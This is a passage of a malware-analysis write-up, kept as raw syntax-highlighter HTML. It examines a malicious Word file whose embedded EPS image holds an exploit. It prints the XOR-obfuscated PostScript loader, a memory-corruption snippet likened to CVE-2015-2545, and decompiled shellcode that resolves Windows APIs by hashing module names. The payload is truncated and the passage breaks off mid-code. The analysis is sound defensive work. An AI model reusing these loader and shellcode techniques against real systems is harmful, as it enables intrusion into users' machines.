class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-14"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">theme</span><span class="crayon-o">/</span><span class="crayon-v">theme1</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-15"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">_rels</span><span class="crayon-o">/</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">xml</span><span class="crayon-sy">.</span><span class="crayon-e">rels</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-16"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">_rels</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">rels</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882cae6751100082" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ file word/media/image1.eps
word/media/image1.eps: PostScript document text conforming DSC level 3.0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882cae6751100082-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae6751100082-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882cae6751100082-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">file </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">media</span><span class="crayon-o">/</span><span class="crayon-v">image1</span><span class="crayon-sy">.</span><span class="crayon-e">eps</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae6751100082-2"><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">media</span><span class="crayon-o">/</span><span class="crayon-v">image1</span><span class="crayon-sy">.</span><span class="crayon-v">eps</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">PostScript </span><span class="crayon-e">document </span><span class="crayon-e">text </span><span class="crayon-e">conforming </span><span class="crayon-e">DSC </span><span class="crayon-i">level</span><span class="crayon-h"> </span><span class="crayon-cn">3.0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The EPS exploit file is obfuscated by a simple XOR. EPS provides the functionality to XOR variables and evaluate source (<span style="font-family: 'courier new', courier, monospace;">exec</span>). The key used here is <span style="font-family: 'courier new', courier, monospace;">0xc45d6491</span> on a big hex-encoded string and <span style="font-family: 'courier new', courier, monospace;">exec</span> is called on the decrypted buffer.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882cae8119217433" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ cat word/media/image1.eps
%!PS-Adobe-3.0
%%BoundingBox:   36   36 576 756
%%Page: 1 1
/A3{ token pop exch pop } def /A2  def /A4{ /A1 exch def 0 1 A1 length 1 sub { /A5 exch def A1 A5 2 copy get A2 A5 4 mod get xor put } for A1 } def &lt;bf7d4bd9[...]b97d44b1&gt; A4 A3 exec quit</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882cae8119217433-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae8119217433-2">2</div><div class="crayon-num" data-line="crayon-60581b882cae8119217433-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae8119217433-4">4</div><div class="crayon-num" data-line="crayon-60581b882cae8119217433-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae8119217433-6">6</div><div class="crayon-num" data-line="crayon-60581b882cae8119217433-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae8119217433-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882cae8119217433-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">cat </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">media</span><span class="crayon-o">/</span><span class="crayon-v">image1</span><span class="crayon-sy">.</span><span class="crayon-i">eps</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae8119217433-2"><span class="crayon-ta">%</span><span class="crayon-o">!</span><span class="crayon-v">PS</span><span class="crayon-o">-</span><span class="crayon-v">Adobe</span><span class="crayon-o">-</span><span class="crayon-cn">3.0</span></div><div class="crayon-line" id="crayon-60581b882cae8119217433-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae8119217433-4"><span class="crayon-ta">%</span><span class="crayon-o">%</span><span class="crayon-v">BoundingBox</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-cn">36</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-cn">36</span><span class="crayon-h"> </span><span class="crayon-cn">576</span><span class="crayon-h"> </span><span class="crayon-cn">756</span></div><div class="crayon-line" id="crayon-60581b882cae8119217433-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae8119217433-6"><span class="crayon-ta">%</span><span class="crayon-o">%</span><span class="crayon-v">Page</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b882cae8119217433-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae8119217433-8"><span class="crayon-o">/</span><span class="crayon-e">A3</span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-e">token </span><span class="crayon-e">pop </span><span class="crayon-e">exch </span><span class="crayon-i">pop</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-e">def</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">A2</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">def</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">A4</span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">A1</span><span class="crayon-h"> </span><span class="crayon-e">exch</span><span class="crayon-h"> </span><span class="crayon-e">def</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">A1</span><span class="crayon-h"> </span><span class="crayon-e">length</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">sub</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">A5 </span><span class="crayon-e">exch </span><span class="crayon-e">def </span><span class="crayon-e">A1 </span><span class="crayon-i">A5</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">copy </span><span class="crayon-e">get </span><span class="crayon-e">A2 </span><span class="crayon-i">A5</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-h"> </span><span class="crayon-e">mod </span><span class="crayon-e">get </span><span class="crayon-st">xor</span><span class="crayon-h"> </span><span class="crayon-i">put</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">A1</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">def</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">bf7d4bd9</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">b97d44b1</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">A4 </span><span class="crayon-e">A3 </span><span class="crayon-e">exec </span><span class="crayon-v">quit</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>Once decrypted, the exploit looks very similar to the one which was well documented by <a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/twoforonefinal.pdf" target="_blank" rel="noopener noreferrer">FireEye</a> in 2015. The vulnerability used at the time was CVE-2015-2545. The main difference is highlighted in the following block, which is how it performs the memory corruption with the <span style="font-family: 'courier new', courier, monospace;">forall</span> instruction.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882cae9781301618" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
500 {
    A31 589567 string copy pop
} repeat
1 array 226545696 forall
/A19 exch def
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882cae9781301618-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae9781301618-2">2</div><div class="crayon-num" data-line="crayon-60581b882cae9781301618-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae9781301618-4">4</div><div class="crayon-num" data-line="crayon-60581b882cae9781301618-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cae9781301618-6">6</div><div class="crayon-num" data-line="crayon-60581b882cae9781301618-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882cae9781301618-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae9781301618-2"><span class="crayon-cn">500</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882cae9781301618-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">A31</span><span class="crayon-h"> </span><span class="crayon-cn">589567</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-e">copy </span><span class="crayon-i">pop</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae9781301618-4"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-i">repeat</span></div><div class="crayon-line" id="crayon-60581b882cae9781301618-5"><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-h"> </span><span class="crayon-cn">226545696</span><span class="crayon-h"> </span><span class="crayon-v">forall</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cae9781301618-6"><span class="crayon-o">/</span><span class="crayon-e">A19 </span><span class="crayon-e">exch </span><span class="crayon-i">def</span></div><div class="crayon-line" id="crayon-60581b882cae9781301618-7"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Once code execution is obtained, it loads a shellcode that retrieves some undocumented Windows APIs such as <span style="font-family: 'courier new', courier, monospace;">NtAllocateVirtualMemory</span>, <span style="font-family: 'courier new', courier, monospace;">NtFreeVirtualMemory</span> and <span style="font-family: 'courier new', courier, monospace;">ZwProtectVirtualMemory</span></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caea731452193" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
 v1 = (*(__readfsdword(0x30u) + 12) + 12);
 v2 = v1-&amp;gt;InLoadOrderModuleList.Flink;
 [...]
 for ( addr_user32 = 0; v2 != v1; v135 = v2 )
 {
   v3 = *(v2 + 48);
   v132 = *(v2 + 44);
   if ( v3 )
   {
     v4 = *v3;
     v5 = 0;
     v6 = 0;
     if ( *v3 )
     {
       do
       {
         if ( v132 &amp;amp;&amp;amp; v6 &amp;gt;= v132 )
           break;
         if ( (v4 - 0x41) &amp;lt;= 0x19u )
           v4 += 0x20;
         v2 = v135;
         v7 = __ROL4__(v5, 7);
         ++v3;
         v5 = v4 ^ v7;
         v4 = *v3;
         ++v6;
       }
       while ( *v3 );
       v1 = v133;
     }
     switch ( v5 )
     {
       case kernel32:
         addr_kernel32 = *(v2 + 24);
         break;
       case ntdll:
         addr_ntdll = *(v2 + 24);
         break;
       case user32:
         addr_user32 = *(v2 + 24);
         break;
       }
     }
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caea731452193-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-2">2</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-4">4</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-6">6</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-8">8</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-10">10</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-12">12</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-14">14</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-16">16</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-18">18</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-20">20</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-22">22</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-24">24</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-26">26</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-28">28</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-30">30</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-32">32</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-34">34</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-36">36</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-38">38</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-40">40</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-42">42</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caea731452193-44">44</div><div class="crayon-num" data-line="crayon-60581b882caea731452193-45">45</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caea731452193-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-2"><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-e">__readfsdword</span><span class="crayon-sy">(</span><span class="crayon-cn">0x30u</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-3"><span class="crayon-h"> </span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-v">InLoadOrderModuleList</span><span class="crayon-sy">.</span><span class="crayon-v">Flink</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-4"><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-5"><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">addr_user32</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">v135</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">v2</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-6"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-7"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-v">v3</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-8"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-v">v132</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-9"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">v3</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">v3</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v6</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-i">v3</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">do</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">v132</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">v132</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">0x41</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x19u</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span 